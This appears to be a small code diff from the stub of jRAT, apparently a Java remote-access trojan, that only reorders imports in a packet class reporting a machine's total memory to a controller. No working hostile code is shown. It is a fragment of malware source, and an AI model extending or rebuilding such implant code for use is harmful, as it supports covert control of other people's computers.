@@ -3,9 +3,9 @@ package se.jrat.stub.packets.outgoing;
 import java.io.DataOutputStream;
 import java.lang.management.ManagementFactory;
 
-import com.sun.management.OperatingSystemMXBean;
-
 import se.jrat.common.io.StringWriter;
+
+import com.sun.management.OperatingSystemMXBean;
 
 
 public class Packet13InitTotalMemory extends AbstractOutgoingPacket {
